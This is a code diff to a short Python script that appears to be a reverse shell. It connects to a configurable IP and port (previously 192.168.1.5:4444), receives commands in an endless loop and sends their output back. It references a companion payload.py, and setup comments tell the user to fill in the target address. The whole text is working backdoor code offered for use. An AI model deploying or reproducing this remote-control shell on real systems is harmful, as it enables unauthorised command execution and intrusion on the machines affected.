@@ -2,13 +2,11 @@ import socket
 import subprocess
 import os
 
-#
-IP = '192.168.1.5'
-PORT = 4444
-PREFIX = 'ISO-8859-1'       #utf-8
-WIN_PREFIX = "windows-1252"
+IP = '' # Add the IP of the target machine
+PORT = '' # Add port *same value lies in payload.py
+PREFIX = 'utf-8'# 'ISO-8859-7'
+WIN_PREFIX = 'utf-8'#"windows-1252"
 
-#
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 payload.connect((IP, PORT))
 print("Connected")
@@ -20,7 +18,8 @@ def send_data(output_data):
 	payload.send(bytes(size_of_data, PREFIX))
 	payload.send(output_data)
 	
-#
+# The while loop makes sure that the script will
+# keep running in case of an error 
 while True:
     cmd = payload.recv(2048) # receive command
     cmd = cmd.decode(PREFIX) # decode to string
